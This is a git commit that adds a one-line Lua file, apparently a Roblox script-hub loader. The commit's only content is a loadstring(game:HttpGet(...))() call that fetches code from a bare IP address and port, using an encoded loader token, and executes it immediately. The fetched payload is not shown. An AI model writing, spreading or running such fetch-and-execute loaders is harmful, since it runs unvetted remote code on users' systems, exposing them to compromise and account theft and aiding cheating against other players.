c5eb873ee34f6bb979a3c3cfc629dd53c4ff14cf
real-scriptz <kaicnet7@gmail.com>
2026-01-18 09:46:54 +0800

    Add script to load external content from URL

---
+++ NatHubLuarmor.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImZhYzMzYWUwLWM5N2YtNDFhZS05ZGI4LTIxNjQxNzBlZjE4MiIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
